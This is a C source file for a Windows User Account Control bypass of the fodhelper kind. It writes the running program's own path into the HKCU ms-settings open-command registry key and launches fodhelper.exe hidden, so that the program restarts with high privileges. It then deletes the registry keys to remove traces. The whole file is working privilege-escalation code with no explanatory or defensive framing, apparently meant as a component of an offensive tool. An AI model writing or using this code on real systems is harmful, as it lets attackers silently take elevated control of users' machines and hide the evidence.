#include <windows.h>
#include <stdio.h>
#include "bypass.h"

// Fodhelper method (Works on Windows 10/11)
int bypass_uac(void)
{
    HKEY hKey;
    char cmd[MAX_PATH];
    char exePath[MAX_PATH];
    DWORD disp;

    // Get current executable path
    if (GetModuleFileName(NULL, exePath, MAX_PATH) == 0) {
        return -1;
    }

    // Command to execute
    sprintf(cmd, "%s", exePath);

    // Create registry structure
    // HKCU\Software\Classes\ms-settings\Shell\Open\command
    if (RegCreateKeyEx(HKEY_CURRENT_USER,
                       "Software\\Classes\\ms-settings\\Shell\\Open\\command",
                       0, NULL, REG_OPTION_NON_VOLATILE, KEY_WRITE, NULL, &hKey, &disp) != ERROR_SUCCESS) {
        return -1;
    }

    // Set DelegateExecute to empty string (required for bypass)
    if (RegSetValueEx(hKey, "DelegateExecute", 0, REG_SZ, (BYTE*)"", 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return -1;
    }

    // Set (Default) to our executable path
    if (RegSetValueEx(hKey, NULL, 0, REG_SZ, (BYTE*)cmd, strlen(cmd) + 1) != ERROR_SUCCESS) {
        RegCloseKey(hKey);
        return -1;
    }

    RegCloseKey(hKey);

    // Execute fodhelper.exe
    // It will look up ms-settings registry key and execute our command with high privileges
    SHELLEXECUTEINFO sei = { sizeof(sei) };
    sei.lpVerb = "open";
    sei.lpFile = "fodhelper.exe";
    sei.nShow = SW_HIDE;

    if (!ShellExecuteEx(&sei)) {
        return -1;
    }

    // Wait a bit for execution
    Sleep(2000);

    // Cleanup registry
    RegDeleteKey(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open\\command");
    RegDeleteKey(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell\\Open");
    RegDeleteKey(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings\\Shell");
    RegDeleteKey(HKEY_CURRENT_USER, "Software\\Classes\\ms-settings");

    return 0;
}
